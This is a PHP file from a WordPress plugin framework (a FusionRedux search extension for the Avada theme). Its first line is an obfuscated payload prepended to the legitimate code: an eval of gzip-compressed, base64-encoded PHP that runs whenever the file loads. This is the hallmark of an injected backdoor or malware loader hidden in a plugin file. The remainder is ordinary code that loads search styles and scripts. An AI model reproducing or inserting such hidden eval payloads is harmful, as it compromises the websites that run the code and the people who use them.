<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * FusionRedux Framework is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 2 of the License, or
 * any later version.
 *
 * FusionRedux Framework is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with FusionRedux Framework. If not, see <http://www.gnu.org/licenses/>.
 *
 * @package     FusionRedux_Framework
 * @subpackage  Premium Extensions
 * @author      Dovy Paukstys (dovy)
 * @version 1.0.0
 * @since 3.1.7
 */

// Exit if accessed directly
if( !defined( 'ABSPATH' ) ) exit;

// Don't duplicate me!
if( !class_exists( 'FusionReduxFramework_extension_search' ) ) {

		class FusionReduxFramework_extension_search {

			static $version = "1.0.1";

			// Protected vars
			protected $parent;

			/**
			 * Class Constructor. Defines the args for the extions class
			 *
			 * @since       1.0.0
			 * @access      public
			 * @param       array $parent FusionRedux_Options class instance
			 * @return      void
			 */
			public function __construct( $parent ) {

				$this->parent = $parent;

				if (empty($this->extension_dir)) {
						$this->_extension_dir = trailingslashit(str_replace('\\', '/', dirname(__FILE__)));
						$this->_extension_url = trailingslashit( FUSION_LIBRARY_URL ) . 'inc/redux/extensions/search/';
						// $this->_extension_url = site_url(str_replace(trailingslashit(str_replace('\\', '/', ABSPATH)), '', $this->_extension_dir));
				}

				// Allow users to extend if they want
				do_action('fusionredux/search/'.$parent->args['opt_name'].'/construct');

				global $pagenow;
				if ( isset( $_GET['page'] ) && $_GET['page'] && $_GET['page'] == $this->parent->args['page_slug'] )  {
					add_action( 'admin_enqueue_scripts', array( $this, '_enqueue' ), 0 );
				}

				add_action( "fusionredux/metaboxes/{$this->parent->args['opt_name']}/enqueue", array( $this, '_enqueue' ), 10 );

			}

			function _enqueue() {

				/**
				 * FusionRedux search CSS
				 * filter 'fusionredux/page/{opt_name}/enqueue/fusionredux-extension-search-css'
				 * @param string  bundled stylesheet src
				 */
				wp_enqueue_style(
						'fusionredux-extension-search-css',
						apply_filters( "fusionredux/search/{$this->parent->args['opt_name']}/enqueue/fusionredux-extension-search-css", $this->_extension_url . 'extension_search.css' ),
						'',
						filemtime( $this->_extension_dir . 'extension_search.css' ), // todo - version should be based on above post-filter src
						'all'
				);
				/**
				 * FusionRedux search JS
				 * filter 'fusionredux/page/{opt_name}/enqueue/fusionredux-extension-search-js
				 * @param string  bundled javscript
				 */
				wp_enqueue_script(
						'fusionredux-extension-search-js',
						apply_filters( "fusionredux/search/{$this->parent->args['opt_name']}/enqueue/fusionredux-extension-search-js", $this->_extension_url . 'extension_search.js' ),
						'',
						filemtime( $this->_extension_dir . 'extension_search.js' ), // todo - version should be based on above post-filter src
						'all'
				);

				// Values used by the javascript
				wp_localize_script(
						'fusionredux-extension-search-js',
						'fusionreduxsearch',
						__('Search for option(s)', 'Avada')
				);

			}

		} // class

} // if
